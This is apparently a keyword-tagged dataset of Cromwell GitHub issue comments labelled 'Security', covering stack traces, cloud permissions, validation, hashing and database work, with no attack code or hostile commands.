Security,"Partially answering my own question: https://github.com/juliangehring/GMAP-GSNAP/blob/master/src/access.c#L595-L623. If the `shmget` on line `595` succeeds because an existing shared memory segment exists, then we enter the `else if` block and end up printing `Attached existing memory`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-446377103:97,access,access,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-446377103,1,['access'],['access']
Security,"Per @davidbernick's comments on Slack, this guide should include how Cromwell administrators should set up Authorization, Authentication, Encryption, and Persistent Databases. This guide will be created during the [Doc-A-Thon](https://docs.google.com/document/d/1M5u-ESSpt_eM0ORsvIu2AoOtvYXImPmAKoyvXFo4p9s/edit) in November.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2327#issuecomment-332204672:107,Authoriz,Authorization,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2327#issuecomment-332204672,3,"['Authenticat', 'Authoriz', 'Encrypt']","['Authentication', 'Authorization', 'Encryption']"
Security,"Per my investigation of #1740 I can confirm the validation is running synchronous to submission, which it should not be. But the API is returning an error for malformed input and not just timing out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328286341:48,validat,validation,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328286341,1,['validat'],['validation']
Security,"Please check this issue.; I think this issue is another problem . > Caused by: common.exception.AggregatedMessageException: Error(s):; > Could not evaluate expression: write_lines(array_of_files): Access Denied (Service: S3Client; Status; > Code: 403; Request ID: CB48F5CFE95BBD50); > at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:68); > at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:64); > at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExe; > cutionActor.scala:563); > ... 31 common frames omitted; > [2019-01-09 05:21:48,83] [error] WorkflowManagerActor Workflow fb387147-f98a-4397-92b3-700d8c607a45 f; > ailed (during ExecutingWorkflowState): java.lang.RuntimeException: AwsBatchAsyncBackendJobExecutionAc; > tor failed and didn't catch its exception.; > at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrE; > lse(StandardSyncExecutionActor.scala:183); > at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrE; > lse(StandardSyncExecutionActor.scala:180); > at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:298); > at akka.actor.dungeon.FaultHandling.handleFailure(FaultHandling.scala:263); > at akka.actor.dungeon.FaultHandling.handleFailure$(FaultHandling.scala:254); > at akka.actor.ActorCell.handleFailure(ActorCell.scala:431); > at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); > at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); > at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); > at akka.dispatch.Mailbox.run(Mailbox.scala:224); > at akka.dispatch.Mailbox.exec(Mailbox.scala:235); > at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > at akka.dispatch.forkjo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-452577365:197,Access,Access,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-452577365,9,"['Access', 'Validat', 'validat']","['Access', 'Validation', 'ValidationTry', 'validation']"
Security,Please hold on to this thought! I think the responsibility of that shouldn't lie with the ValidateActor!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197500994:90,Validat,ValidateActor,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197500994,1,['Validat'],['ValidateActor']
Security,Please say your image hash e.g. `87-xxxxxxx` and backend (which I assume is Batch).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239490428:22,hash,hash,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239490428,1,['hash'],['hash']
Security,Please take a look here https://cloud.google.com/logging/docs/audit,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685812146:62,audit,audit,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685812146,1,['audit'],['audit']
Security,Probably linked to https://github.com/broadinstitute/cromwell/issues/1886; Retrying credentials validation here https://github.com/broadinstitute/cromwell/blob/develop/filesystems/gcs/src/main/scala/cromwell/filesystems/gcs/auth/GoogleAuthMode.scala#L66 should fix all those issues,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270#issuecomment-301503310:96,validat,validation,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270#issuecomment-301503310,1,['validat'],['validation']
Security,"Probably worth distinguishing the difference between the server instance and individual job instances. Each can get independent access permissions. I can see the need for job instances to be able to read from various input sources, including those not owned by the account. Does the server, i.e. the Cromwell process, need to read data across accounts as well? I was under the impression that it only needed to track status and logs for workflows and jobs submitted to it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-501247084:128,access,access,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-501247084,1,['access'],['access']
Security,Provider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19]; at scala.collection,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:2903,hash,hash,2903,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['hash'],['hash']
Security,"Quoting @geoffjentry from earlier comment so that it's not lost:. > @gauravs90 I've generally seen the akka folks recommend directly passing references to actors which need to be used. That has multiple benefits (e.g. makes it easy to switch out and/or dep injection, etc). My off the cuff reaction is that that seems simpler to just pass the required reference around, although I'll admit I'm basing that purely on your description and not having looked at the changes yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218895676:257,inject,injection,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218895676,2,['inject'],['injection']
Security,"Random google-r checking in, I had some similar confusion with CWL and InitialWorkDirRequirements and although it's not directly related to this issue as I wasn't replicating with docker, I wanted to comment in case anyone else finds themselves here, especially within Cromwell. My confusion can because I had a CommandLineTool that would only generate its files where the inputs are. Basically I needed to localise the file to the execution directory, and then reference it in a glob expression on output. TL;DR, put the InitialWorkDirRequirement file expression in a `Dirent` rather than on the requirement. By _carefully_ re-reading the [`InitialWorkDirRequirement`](https://www.commonwl.org/v1.0/Workflow.html#InitialWorkDirRequirement).[`Dirent`](https://www.commonwl.org/v1.0/Workflow.html#InitialWorkDirRequirement) documentation, we find:. #### InitialWorkDirRequirement.listing; > May be an expression. If so, the expression return value must validate as {type: array, items: [File, Directory]}. This is what I initially did, which looks like:; ```yaml; requirements:; InitialWorkDirRequirement:; listing: $([inputs.inputFile]); ```; but my output expression was never localised to this new directory. Let's look at Dirent:. #### Dirent.entry; > If the value is an expression that evaluates to a File object, this indicates the referenced file should be added to the designated output directory prior to executing the tool. Okay cool, this is basically what I want, and paired with:. #### Dirent.entryname; > The name of the file or subdirectory to create in the output directory. If entry is a File or Directory, the entryname field overrides the value of basename of the File or Directory object. Optional. This is exactly what I want. I need to provide the expression for Dirent.entry, and exclude entryname, and Cromwell successfully localises this. Hence putting this together so that a tabix CommandLineTool can generate the file in the following CommandLineTool:. ```cwl; class: Comman",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3639#issuecomment-452514774:952,validat,validate,952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3639#issuecomment-452514774,1,['validat'],['validate']
Security,"Re this PR, I'm re-working it to pass all of the task call-specific monitoring info (workflow name/id, task call name/index/attempt, `inputs`, `disks`, and the opaque image-specific `monitoringConfig` string) through a JSON config file on GCS (thanks @kshakir for the idea!). This way, we no longer have to use environmental variables, and can pass much more data than can be held in a variable (looking at you, `inputs`!). That still has a potential problem of running against the API quota for GCS, but since we already access multiple files from that execution bucket inside the task, the assumption is that accessing one extra file won't hurt. However, I'm unsure if we should just get rid of all of the environmental variables in favor of one that points to the GCS URL of the JSON config, or should we keep them (and thus duplicate information) for backwards compatibility. AFAIK, hardly anyone used this feature yet, especially given that the current ""official"" `monitoring_image` has been essentially broken, because Google decided to start failing Stackdriver Monitoring requests if they are submitted more than 1/minute, for a given time series. We should fix the `monitoring_image` separately (or replace it with the BigQuery version), but the question remains whether we still want to keep those env vars around for that previous use case (for anyone who might've been using a custom `monitoring_image` already). Alternatively, we could pass only the `inputs` and `monitoringConfig` through a JSON blob on GCS, and continue with the rest as-is via env vars (but that's messy, IMO).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502266400:522,access,access,522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502266400,2,['access'],"['access', 'accessing']"
Security,Request for a centaur test to validate that this is doing what you expect,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3966#issuecomment-410081690:30,validat,validate,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3966#issuecomment-410081690,1,['validat'],['validate']
Security,Requesting reviews from:; - @kshakir because you created the values being exposed; - @rsasch to make sure adding new fields to `/query` won't play badly with Job Manager,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4831#issuecomment-482738687:74,expose,exposed,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4831#issuecomment-482738687,1,['expose'],['exposed']
Security,"Right I just meant that in the tests the ratio (DB access / executedCode) may be higher compared to ""normal execution"" where we spend a lot of time waiting for calls to end. But yes production will definitely not be an easier environment than tests :); I kinda like the DataAccess actor option, although I think slick already manages its own pool of threads and everything, so maybe just by tweaking some configuration we could improve performance before going full Super Saiyan Actor Scaling mode.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444:51,access,access,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444,1,['access'],['access']
Security,"Right, the issue is that the name of the output is wrong, so `gvcf` doesn't exist. It would be nice for it to validate before running to tell the user that though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298679419:110,validat,validate,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298679419,1,['validat'],['validate']
Security,"RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .cyvcf2 import (VCF, Variant, Writer, r_ as r_unphased, par_relatedness,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/_libs/__init__.py:4: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .tslib import iNaT, NaT, Timestamp, Timedelta, OutOfBoundsDatetime; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/__init__.py:26: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (hashtable as _hashtable,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/dtypes/common.py:6: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/util/hashing.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import hashing, tslib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/base.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (lib, index as libindex, tslib as libts,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/tseries/offsets.py:21: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; import pandas._libs.tslibs.offsets as liboffsets; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/ops.py:16: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos as libalgos, ops as libops; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:1323,hash,hashing,1323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['hash'],['hashing']
Security,"SFS does not have a ""use original path"" AFAIK. It has ""copy"", ""hard-link"" and ""soft-link"".; Those are ""duplication strategies"".; There are also ""hashing strategies"", for file, which can be ""hash file content"" or ""hash file path"". With an optional ""use sibling md5 if it exists"".; I guess the question is, how much of all that do we want to standardize.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306236760:145,hash,hashing,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306236760,3,['hash'],"['hash', 'hashing']"
Security,"Semi :+1: ... I want Scott's various logging things hashed out and I wasn't particularly thorough, trying to balance not delaying you too long, so it'd be good to get another quick pair of eyes or something like that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188441142:52,hash,hashed,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188441142,1,['hash'],['hashed']
Security,Should we confirm the cached-to files are still where they are supposed to be and accessible?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306233790:82,access,accessible,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306233790,1,['access'],['accessible']
Security,Should we just rewrite the hash / equals methods in the Scope trait ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-254944647:27,hash,hash,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-254944647,1,['hash'],['hash']
Security,"Similar to other parser-related errors reported by Andrea in WB, [via google](https://www.google.com/search?q=owlapi+thread+safety) I'm not convinced the OWL API is thread safe. Some info/debug logging might expose if multiple threads are trying to access the OWL API, and synchronization might fix it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171:208,expose,expose,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171,2,"['access', 'expose']","['access', 'expose']"
Security,"Since it's been a month I thought I'd post an update. Main items:; - In general I'm having to make a lot more changes to the Scala code than I expected due to queries being written in a way that Postgres doesn't like. (This isn't a criticism, more of a heads-up.) Nothing functional, just refactoring.; - The way `Blob` is handled in Slick+Postgres turns out to be a massive pain. I'm not sure if Slick is lazy-loading these fields or I just don't understand how it works under the hood, but the workaround is that the blobs need to be accessed as part of a transaction, which involved some refactoring of downstream processing.; - Semi-related question: is there a reason why the entire contents of the `importsZip` need to be stored in the database? This quickly leads to an enormous METADATA_ENTRY table - possibly because I have call caching turned on, I haven't checked whether this is the cause yet.; - The auto-incremented fields that are `Option[Long]` in the data model can't be handled the same way in Postgres; I haven't decided whether this is simply different database behavior or a bug somewhere. Anyway I found a workaround for that too.; - I may have messed up and branched from `master` in my fork by mistake, and in any case I'm definitely out of sync with your `develop`. Do you have a preferred workflow to bring my branch up to date, i.e. to minimize the mess in the Git history? (Despite using Git daily I'm still not totally sure what ""best practice"" is.). At this point I can at least run a workflow using Postgres, minus call caching. I'm going to be focusing on completing and testing this in the next couple of weeks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402:536,access,accessed,536,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402,2,['access'],['accessed']
Security,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:391,access,access,391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763,1,['access'],['access']
Security,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:263,secur,security,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692,1,['secur'],['security']
Security,"So I tested that this will now correctly fail a workflow, and indeed:; ```; ERROR - WorkflowManagerActor Workflow f587f57a-2897-4450-a4e1-410442f2460c failed (during ExecutingWorkflowState): Variable 'xs' not found; wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'xs' not found; ```. However as noted, this is a Cromwell runtime catch. It'd be much nicer as a WDL4S validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1774#issuecomment-298086885:379,validat,validation,379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1774#issuecomment-298086885,1,['validat'],['validation']
Security,"So here is a final update. I have tried running Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Creator (roles/storage.objectCreator); 4. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Viewer (roles/storage.objectViewer). And I have got the following error from Cromwell:; ```; java.lang.Exception: Task xxx.xxxNA:1 failed. Job exited without an error, exit code 0. PAPI error code 9. Please check the log file for more details: xxx; ```; And the log just contains this cryptic message:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedP",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:162,access,access-control,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,3,['access'],['access-control']
Security,"So if a a singleton DataAccess can only handle so many connections, could this become a problem when we start scaling ? Or maybe we don't expect that many DB access in real life and the tests are really overstressing it ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143028903:158,access,access,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143028903,1,['access'],['access']
Security,So successes are not wrapped - only failures are (which the ticket was about). With the exception of the validate endpoint which has a special response format which would have been weird not updating.; It's easy enough to wrap the success too - It just feels risky too me to update the entire API responses format a week before firecloud goes live but if that's fine I can wrap the successes too and let them now. We should tell them anyway that the error format will change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379:105,validat,validate,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379,1,['validat'],['validate']
Security,"So, quick thoughts on this. +1 on @delagoya's sidecar container concept (with some concerns I'll mention below). When implementing #3835 I had this issue in mind as well, along with some thoughts on implementation. My thought was to have a sidecar always running, using the [system events](https://docs.docker.com/engine/api/v1.37/#operation/SystemEvents) api to monitor for containers that have exited. At that time, it can [inspect the container](https://docs.docker.com/engine/api/v1.37/#operation/ContainerInspect), make sure it's a cromwell container, and use the volume information (in conjunction with the TASK_ID environment variable I'm setting) to find the local files and copy them out to s3. Something to consider that I don't see discussed yet on this thread: A sidecar approach requires the sidecar to have fairly permissive access to S3. On the positive side, this does alleviate the need for S3 permissions on the container running the task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-401398435:839,access,access,839,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-401398435,1,['access'],['access']
Security,"Some sloppy experimental procedure is to blame for incorrect conclusions in the previous (deleted) comment. It's enough for the input and task name to be the same:; ```; workflow x {; call cram; call y { input:; cram = cram.scram; }; }. task cram {; command {; echo "".""; }; output {; String scram = "".""; }; }. task y {; String cram; command {; echo "".""; }; }; ```; ```; ERROR: Bad target for member access 'cram.scram': 'cram' was a String (line 4, col 21):. cram = cram.scram; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-418892826:399,access,access,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-418892826,1,['access'],['access']
Security,Something looks like it's got an infinite recursion (from SBT logs):; ```; [0m[[0m[31merror[0m] [0m[0mjava.lang.StackOverflowError[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:64)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:211)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:145)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.Tuple2.hashCode(Tuple2.scala:19)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.Statics.anyHash(Statics.java:115)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap$MangledHashing.hash(TrieMap.scala:984)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.computeHash(TrieMap.scala:829)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.get(TrieMap.scala:844)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains$(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.contains(TrieMap.scala:631)[0m; [0m[[0m[31merror[0m] [0m[0m	at scoverage.Invoker$.invoked(Invoker.scala:34)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:44)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloud,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855:189,hash,hashing,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855,4,['hash'],"['hash', 'hashCode', 'hashing']"
Security,Sounds like a potential validate endpoint.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-293584947:24,validat,validate,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-293584947,1,['validat'],['validate']
Security,Spark Backend for the PBE (develop) branch. Need to validate Cromwell's task description for different spark execution modes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1087#issuecomment-229145028:52,validat,validate,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1087#issuecomment-229145028,1,['validat'],['validate']
